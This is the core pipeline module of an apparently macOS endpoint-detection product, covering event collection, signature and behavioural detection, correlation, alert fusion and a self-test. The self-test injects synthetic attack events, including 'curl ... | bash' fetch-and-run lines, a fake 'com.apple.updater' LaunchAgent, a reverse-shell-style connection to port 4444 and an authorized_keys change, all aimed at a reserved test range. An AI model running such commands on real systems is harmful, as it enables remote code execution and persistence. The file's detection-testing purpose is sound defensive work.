"""核心流水线：采集 → 归一化 → 检测 → 关联 → 量化 → 存储。"""
from __future__ import annotations

import os
import platform
import socket
import threading
import time
from typing import Any, Dict, List, Optional

from . import __version__, collectors, compliance, scoring
from . import ai as ai_mod
from . import firewall as firewall_mod
from . import audit as audit_mod
from . import auth as auth_mod
from . import monthly as monthly_mod
from . import rules_ext
from . import updates as updates_mod
from .canary import Canary
from .detect import Correlator, Engine
from .detect import rules_builtin
from .intel import Intel
from .inventory import Inventory
from .model import Event, Finding, iso
from .netintel import NetIntel
from .playbook import Playbooks
from .respond import Responder
from .store import Store
from .ueba import UEBA

# 检测与响应层产出的衍生事件 → 告警（规则引擎不负责这部分，避免与签名规则重复）
FUSION_MAP = {
    "canary.trip": ("CANARY-TRIP", "诱饵文件被触碰", "critical",
                    ["canary", "honeypot"], ["T1078", "T1005"]),
    "ndr.beaconing": ("NDR-BEACON", "疑似 C2 心跳（连接间隔高度规律）", "high",
                      ["command_control"], ["T1071", "T1571"]),
    "ndr.ioc_ip": ("TI-IOC-IP", "外联命中威胁情报库 IP", "high",
                   ["command_control", "threat_intel"], ["T1071"]),
    "ndr.risky_domain": ("NDR-RISKY-DOMAIN", "外联动态 DNS / 隧道类域名", "medium",
                         ["command_control"], ["T1568", "T1071"]),
    "ndr.risky_port": ("NDR-RISKY-PORT", "外联命中高风险端口", "high",
                       ["command_control"], ["T1571"]),
    "ndr.direct_ip": ("NDR-DIRECT-IP", "非浏览器进程直连未解析域名公网 IP", "medium",
                      ["command_control"], ["T1071"]),
    "ueba.new_persistence": ("UEBA-NEW-PERSIST", "首次出现的常驻项（行为基线偏离）", "high",
                             ["persistence", "ueba"], ["T1543"]),
    "ueba.new_process": ("UEBA-NEW-PROC", "首次出现的进程（行为基线偏离）", "low",
                         ["ueba", "execution"], ["T1204"]),
    "ueba.new_destination": ("UEBA-NEW-DEST", "首次出现的外联目的地", "low",
                             ["ueba", "command_control"], ["T1071"]),
}


def _fusion_advice(rule_id: str) -> str:
    return {
        "CANARY-TRIP": "诱饵文件本不该被任何正常业务访问。立即定位访问进程与其父进程，"
                       "隔离该进程并导出证据；这类命中误报率极低，按入侵处理。",
        "NDR-BEACON": "连接间隔高度规律是 C2 心跳的典型特征。抓取该进程的完整命令行、"
                      "加载的模块与外联时间线，确认是否为业务轮询（如监控 agent）后再定性。",
        "TI-IOC-IP": "对端 IP 命中情报库。核对情报来源与置信度，导出该连接前后的进程行为，"
                     "确认是否为供应链/第三方服务的正常出口。",
        "NDR-RISKY-DOMAIN": "动态 DNS / 隧道服务常被用于规避封禁。确认该域名的注册时间与"
                            "业务归属，必要时在出口 DNS 上做阻断观察。",
        "NDR-RISKY-PORT": "非常规端口外联可能绕过基于端口的出口策略。检查该端口的业务合理性，"
                          "并对该进程做完整行为回放。",
        "NDR-DIRECT-IP": "直连 IP 绕过了域名信誉体系。确认为什么这个进程不做域名解析，"
                         "提取其完整网络行为与文件落地情况。",
        "UEBA-NEW-PERSIST": "常驻项首次出现意味着启动项集合发生了变化。核对是否为软件更新"
                            "或用户自装，再决定是否保留。",
        "UEBA-NEW-PROC": "首次出现的进程不一定是恶意的，但值得确认来源：谁启动的、从哪来、"
                         "之后做了什么。",
        "UEBA-NEW-DEST": "首次外联目的地，观察其是否重复、是否伴随数据外发。",
    }.get(rule_id, "人工复核该告警的上下文。")


class Core:
    def __init__(self, cfg: Dict[str, Any]):
        self.cfg = cfg
        self.t0 = time.time()
        self.store = Store(cfg)
        # ---- 治理层：审计链 / 账号权限 / 更新通道 ----
        self.audit = audit_mod.AuditLog(cfg)
        self.auth = auth_mod.Auth(cfg)
        self.auth.set_audit(self.audit)
        self.updates = updates_mod.Updates(cfg)
        self.updates.set_audit(self.audit)
        self.rules_ext_index: List[Dict[str, Any]] = []
        self.collectors = collectors.build(cfg, self.store)
        self.engine = Engine(cfg, self.store, self._all_rules())
        self.correlator = Correlator(cfg, self.store)
        self.responder = Responder(cfg, self.store)
        self.firewall = firewall_mod.Firewall(cfg, self.store)
        # ---- 检测与响应：UEBA / NDR / 诱饵 / 情报 / SOAR / 资产 / 合规 ----
        self.intel = Intel(cfg, self.store)
        self.ueba = UEBA(cfg, self.store)
        self.netintel = NetIntel(cfg, self.store, self.intel)
        self.canary = Canary(cfg, self.store)
        self.inventory = Inventory(cfg, self.store)
        self.playbooks = Playbooks(cfg, self.store, self.responder)
        # AI 研判层：能跑就挂，配置缺失也只是少一块功能，不影响采集与检测
        self.ai = ai_mod.AI(cfg, self.store)
        try:
            self.updates.register_probe(self._rules_probe)
        except Exception:
            pass
        self.compliance_state: Dict[str, Any] = {}
        self._last_canary = 0.0
        self._last_inv = 0.0
        self._base_sig = ""
        self._stop = threading.Event()
        self._threads: List[threading.Thread] = []
        self.host = cfg.get("host_label") or platform.node() or socket.gethostname()
        self.user = os.environ.get("USER") or os.path.expanduser("~").split("/")[-1]

    # ---------- 规则：内置 + 外部声明式规则包 ----------
    def _all_rules(self) -> List[Any]:
        rules = rules_builtin.load()
        try:
            ext, index = rules_ext.load_packs(self.cfg)
        except Exception as exc:
            self.rules_ext_index = [{"name": "(load-failed)", "rules": 0, "error": str(exc)}]
            return rules
        self.rules_ext_index = index
        # 外部包不得覆盖内置规则 ID
        taken = {getattr(r, "id", "") for r in rules}
        rules = rules + [r for r in ext if getattr(r, "id", "") not in taken]
        return rules

    def reload_rules(self, actor: str = "system", role: str = "system") -> Dict[str, Any]:
        """重新加载内置 + 外部规则包，并重建引擎规则表。"""
        try:
            rules = self._all_rules()
            self.engine.rules = [r for r in rules if getattr(r, "enabled", True)]
            external = sum(int(p.get("rules") or 0) for p in self.rules_ext_index
                           if not p.get("error"))
            total = len(self.engine.rules)
            res = {"ok": True, "rules": total, "builtin": max(0, total - external),
                   "packs": self.rules_ext_index, "external": external}
            self.audit.append("rules.reload", actor=actor, role=role,
                              target="rules", result="ok", detail=res)
            return res
        except Exception as exc:
            self.audit.append("rules.reload", actor=actor, role=role, target="rules",
                              result="error", detail={"error": f"{type(exc).__name__}: {exc}"})
            return {"ok": False, "error": f"{type(exc).__name__}: {exc}"}

    def _rules_probe(self) -> Dict[str, Any]:
        """更新通道健康探针：规则包与剧本都能被真实解析，且检测能力未归零。"""
        res = self.reload_rules(actor="update-probe", role="system")
        pb = self.playbooks.reload() if hasattr(self.playbooks, "reload") else {}
        total = int(res.get("rules") or 0)
        ok = bool(res.get("ok")) and total >= 1
        detail = f"规则 {total} 条（外部 {res.get('external', 0)}），剧本 {len(getattr(self.playbooks, 'items', []) or [])} 个"
        if not ok:
            detail += f"；规则加载失败：{res.get('error')}"
        if isinstance(pb, dict) and pb.get("errors"):
            detail += f"；剧本问题 {len(pb.get('errors') or [])} 处"
            ok = ok and len(pb.get("errors") or []) < 1
        return {"name": "检测规则与剧本可用", "ok": ok, "detail": detail}

    # ---------- 治理视图 ----------
    def governance(self) -> Dict[str, Any]:
        out: Dict[str, Any] = {}
        for name, fn in (("auth", self.auth.status), ("audit", self.audit.stats),
                         ("updates", self.updates.status), ("rules", self._rules_snapshot)):
            try:
                out[name] = fn()
            except Exception as exc:
                out[name] = {"error": f"{type(exc).__name__}: {exc}"}
        out["version"] = __version__
        return out

    def _rules_snapshot(self) -> Dict[str, Any]:
        return {"total": len(self.engine.rules), "packs": self.rules_ext_index}

    def monthly(self, month: str = "", send: bool = False, actor: str = "system",
                role: str = "system") -> Dict[str, Any]:
        try:
            res = monthly_mod.build(self, month=month, send=bool(send))
        except Exception as exc:
            res = {"ok": False, "error": f"{type(exc).__name__}: {exc}"}
        self.audit.append("monthly.report", actor=actor, role=role,
                          target=res.get("month") or month or "(current)",
                          result="ok" if res.get("ok") else "error",
                          detail={"send": bool(send),
                                  "paths": list((res.get("paths") or {}).keys()),
                                  "error": res.get("error", "")})
        return res

    # ---------- 生命周期 ----------
    def start(self) -> None:
        for c in self.collectors:
            if c.enabled and getattr(c, "mode", "poll") == "stream":
                try:
                    c.start()
                except Exception:
                    pass
        t = threading.Thread(target=self._loop, name="atfield-core", daemon=True)
        t.start()
        self._threads.append(t)

    def stop(self) -> None:
        self._stop.set()
        for c in self.collectors:
            try:
                c.close()
            except Exception:
                pass
        self.store.close()

    def _loop(self) -> None:
        last: Dict[str, float] = {}
        while not self._stop.is_set():
            now = time.time()
            batch: List[Event] = []
            for c in self.collectors:
                if not c.enabled:
                    continue
                interval = c.interval if c.interval and c.interval > 0 else 1.0
                if now - last.get(c.name, 0.0) < interval:
                    continue
                last[c.name] = now
                batch.extend(c.run_once())
            if batch:
                self.process(batch)
            self._periodic()
            time.sleep(0.4)

    def _periodic(self) -> None:
        """周期任务：诱饵检查 / 资产清单 / 合规矩阵重建。"""
        now = time.time()
        if now - self._last_canary > 10:
            self._last_canary = now
            try:
                trips = self.canary.poll()
                if trips:
                    self.process(trips)
            except Exception:
                pass
        if now - self._last_inv > 3600:
            self._last_inv = now
            try:
                self.inventory.scan()
            except Exception:
                pass
        base = self.store.get_state("baseline") or {}
        sig = f"{len(base.get('checks') or [])}:{base.get('ts') or base.get('checked_at') or 0}"
        if base and sig != self._base_sig:
            self._base_sig = sig
            try:
                self.compliance_state = compliance.build(base, self.store)
            except Exception:
                pass

    # ---------- 单批处理（自检接口也走这里，保证同一条链路） ----------
    def process(self, events: List[Event]) -> Dict[str, Any]:
        if not events:
            return {"events": 0, "findings": [], "incidents": []}
        self.store.add_events(events)
        findings: List[Finding] = list(self.engine.observe(events))

        # 融合层：行为基线偏离 + 网络画像 → 衍生事件，再回灌签名检测 + 各自告警
        derived: List[Event] = []
        try:
            derived += self.ueba.observe(events)
        except Exception:
            pass
        try:
            derived += self.netintel.observe(events)
        except Exception:
            pass
        if derived:
            self.store.add_events(derived)
            findings += list(self.engine.observe(derived))

        findings += self._fusion_findings(events + derived)

        fdicts = [f.to_dict() for f in findings]
        if fdicts:
            self.store.add_findings(findings)
        incidents = self.correlator.ingest(fdicts) if fdicts else []
        inc_dicts = [i.to_dict() for i in incidents]
        for inc in incidents:
            self.store.add_incident(inc)
        if fdicts:
            try:
                self.playbooks.on_findings(fdicts, inc_dicts)
            except Exception:
                pass
        return {"events": len(events) + len(derived), "findings": fdicts,
                "incidents": inc_dicts}

    def _fusion_findings(self, events: List[Event]) -> List[Finding]:
        out: List[Finding] = []
        seen: set = set()
        for ev in events:
            spec = FUSION_MAP.get(ev.kind)
            if not spec:
                continue
            rid, name, sev, tags, mitre = spec
            # 个别信号自带更精确的等级（如诱饵「被读取」与「被改写」风险不同）
            if ev.kind == "canary.trip" and ev.severity:
                sev = ev.severity if ev.severity in ("low", "medium", "high", "critical") else sev
            actor = str(ev.pid or ev.process or "host")
            key = (rid, actor, ev.ts)
            if key in seen:
                continue
            seen.add(key)
            reason = (ev.subject or {}).get("reason") or (ev.subject or {}).get("reasons") or ""
            if isinstance(reason, list):
                reason = "；".join(str(r) for r in reason)
            out.append(Finding(
                rule_id=rid, name=name, severity=sev, event=ev, actor=actor,
                tags=list(tags), mitre=list(mitre),
                detail=str(reason or name),
                advice=_fusion_advice(rid),
            ))
        return out

    # ---------- 聚合视图 ----------
    def overview(self) -> Dict[str, Any]:
        st = self.store
        posture = scoring.posture(st.get_state("baseline") or {})
        findings = st.snapshot_findings(500)
        incidents = st.snapshot_incidents(50)
        threat = scoring.threat(findings, incidents)
        procs = st.get_state("processes") or {}
        net = st.get_state("connections") or {}
        sess = st.get_state("sessions") or {}
        pers = st.get_state("persistence") or {}
        integ = st.get_state("integrity") or {}
        priv = st.get_state("privileged") or {}
        ls = st.get_state("logstream") or {}
        base = st.get_state("baseline") or {}

        coll = []
        for c in self.collectors:
            cmeta = (st.meta.get("collectors") or {}).get(c.name) or {}
            item = c.detail()
            item.update({
                "runs": cmeta.get("runs", 0),
                "errors": cmeta.get("errors", 0),
                "last_error": cmeta.get("last_error", ""),
                "last_ms": cmeta.get("last_ms", 0),
            })
            if c.name == "privileged":
                item["reason"] = getattr(c, "reason", "") or item.get("reason", "")
            coll.append(item)

        return {
            "product": "心之壁",
            "version": __version__,
            "host": self.host,
            "user": self.user,
            "platform": f"macOS {platform.mac_ver()[0]}",
            "uptime": int(time.time() - self.t0),
            "started_at": iso(self.t0),
            "now": iso(time.time()),
            "health": posture,
            "threat": threat,
            "threat_color": scoring.threat_level_color(threat["risk"]),
            "counters": st.counters_snapshot(),
            "totals": {
                "events": st.meta.get("events_total", 0),
                "findings": st.meta.get("findings_total", 0),
                "incidents": st.meta.get("incidents_total", 0),
                "processes": procs.get("count", 0),
                "connections": net.get("active", 0),
                "public_connections": net.get("public", 0),
                "listeners": len(net.get("listeners") or []),
                "sessions": len(sess.get("active") or []),
                "persistence": pers.get("count", 0),
                "persistence_suspicious": len(pers.get("suspicious") or []),
                "baseline_fail": (base.get("counts") or {}).get("fail", 0),
                "baseline_warn": (base.get("counts") or {}).get("warn", 0),
                "integrity_watched": len(integ.get("files") or []),
                "integrity_missing": len(integ.get("missing") or []),
            },
            "collectors": coll,
            "telemetry": {
                "logstream": ls,
                "privileged": priv,
                "eslogger_root": bool(priv.get("enabled")),
            },
            "top_findings": findings[:12],
            "recent_incidents": incidents[:6],
            "fusion": {
                "intel": self.intel.stats(),
                "ueba": self.ueba.status(),
                "canary": self.canary.status(),
                "ndr": self.netintel.status(),
                "playbooks": self.playbooks.status(),
                "inventory": self.inventory.status(),
                "compliance": self.compliance_state or (st.get_state("compliance") or {}),
                "tickets": st.snapshot_tickets(80),
                "timeline": st.timeline(120),
            },
            "governance": self.governance(),
            "verdict": self._verdict(posture, threat, base, procs, net),
        }

    def _verdict(self, posture, threat, base, procs, net) -> str:
        parts: List[str] = []
        risk = threat["risk"]
        if risk >= 75:
            parts.append(f"风险指数 {risk}（严重）：已出现高置信攻击链，按应急流程处置")
        elif risk >= 50:
            parts.append(f"风险指数 {risk}（高）：存在多个高危行为，需要人工复核")
        elif risk >= 25:
            parts.append(f"风险指数 {risk}（中）：有可疑行为，建议核查告警来源")
        elif risk >= 8:
            parts.append(f"风险指数 {risk}（低）：偶发异常，处于可观测状态")
        else:
            parts.append(f"风险指数 {risk}（平静）：未发现攻击行为特征")

        health = posture["health"]
        fails = [d for d in posture["dimensions"] if d["failed"] > 0]
        if fails:
            worst = sorted(fails, key=lambda d: d["score"])[0]
            parts.append(f"防护健康度 {health}（{posture['grade']}），短板在「{worst['name']}」——{worst['top_issue']}")
        else:
            parts.append(f"防护健康度 {health}（{posture['grade']}），基线检查未见不合格项")

        counts = (base.get("counts") or {})
        if counts.get("unknown"):
            parts.append(f"另有 {counts['unknown']} 项因权限不足无法判定（非特权模式下的正常降级）")
        if net.get("public"):
            parts.append(f"当前 {net['public']} 条公网连接在观测中")
        return "；".join(parts) + "。"

    # ---------- 自检：把合成事件灌进真实流水线，验证检测/关联是否真的会响 ----------
    def self_test(self) -> Dict[str, Any]:
        now = time.time()
        host = self.host
        demo: List[Event] = [
            Event(kind="process.start", source="selftest", ts=now - 60, host=host,
                  pid=900001, ppid=900000, user=self.user, process="sh",
                  cmdline="curl -fsSL http://198.51.100.7/x.sh | bash", path="/bin/sh",
                  severity="medium"),
            Event(kind="process.start", source="selftest", ts=now - 55, host=host,
                  pid=900002, ppid=900001, user=self.user, process="python3",
                  cmdline="python3 -c import socket,subprocess;subprocess.call(['sh'])",
                  path="/tmp/.payload/py", severity="medium",
                  subject={"suspicious_path": True, "masquerade": False}),
            Event(kind="persistence.add", source="selftest", ts=now - 50, host=host,
                  pid=900002, user=self.user, process="com.apple.updater",
                  cmdline="/bin/sh -c curl -s http://198.51.100.7/b | sh",
                  path=os.path.expanduser("~/Library/LaunchAgents/com.apple.updater.plist"),
                  severity="high",
                  subject={"label": "com.apple.updater", "scope": "user",
                           "run_at_load": True,
                           "suspicious": ["命令含可疑片段「curl」", "RunAtLoad + KeepAlive（开机常驻）"]}),
            Event(kind="net.connect", source="selftest", ts=now - 45, host=host,
                  pid=900002, process="python3", user=self.user,
                  path="198.51.100.7:4444", severity="high",
                  subject={"raddr": "198.51.100.7:4444", "rport": 4444,
                           "rip": "198.51.100.7", "public": True, "risky_port": True}),
            Event(kind="integrity.change", source="selftest", ts=now - 40, host=host,
                  path=os.path.expanduser("~/.ssh/authorized_keys"), severity="high",
                  process="authorized_keys",
                  subject={"reason": "内容哈希变化", "old_digest": "0000", "new_digest": "ffff"}),
            # ---- 融合层：诱饵触碰 ----
            Event(kind="canary.trip", source="selftest", ts=now - 35, host=host,
                  path=os.path.expanduser("~/Documents/账号备份.txt"), process="账号备份.txt",
                  severity="critical",
                  subject={"reason": "诱饵文件被读取（atime 前进）", "note": "伪装成凭据清单"}),
        ]
        # ---- 融合层：信标（规律心跳）—— 用 TEST-NET-2 保留网段，绝不与真实目标混淆 ----
        for i in range(6):
            demo.append(Event(
                kind="net.connect", source="selftest", ts=now - 300 + i * 60, host=host,
                pid=900003, process="python3", user=self.user,
                path="198.51.100.77:8443", severity="medium",
                subject={"raddr": "198.51.100.77:8443", "rport": 8443,
                         "rip": "198.51.100.77", "public": True},
            ))
        # ---- 融合层：UEBA 基线偏离（临时退出学习期，只为本轮演示）----
        prev_obs, prev_t0 = self.ueba.obs, self.ueba.t0
        self.ueba.obs, self.ueba.t0 = 10 ** 6, time.time() - 10 ** 6
        try:
            res = self.process(demo)
        finally:
            self.ueba.obs, self.ueba.t0 = prev_obs, prev_t0
        return {
            "injected_events": len(demo),
            "findings": [{"rule_id": f["rule_id"], "name": f["name"],
                          "severity": f["severity_cn"], "detail": f["detail"],
                          "tags": f.get("tags") or []}
                         for f in res["findings"]],
            "incidents": [{"template": i["template_id"], "title": i["title"],
                           "severity": i["severity_cn"],
                           "stages": [s["stage"] for s in i["stages"]]}
                          for i in res["incidents"]],
            "engines": {
                "signature": sum(1 for f in res["findings"] if not f["rule_id"].startswith(
                    ("NDR-", "TI-", "UEBA-", "CANARY-"))),
                "fusion": [f["rule_id"] for f in res["findings"]
                           if f["rule_id"].startswith(("NDR-", "TI-", "UEBA-", "CANARY-"))],
                "beacons_learned": len(self.netintel.beacons),
                "playbook_runs": len(self.playbooks.history),
            },
            "note": "合成事件只用于验证检测与关联链路，不代表主机真实状态；"
                    "信标演示使用 TEST-NET-2（198.51.100.0/24）文档保留网段",
        }
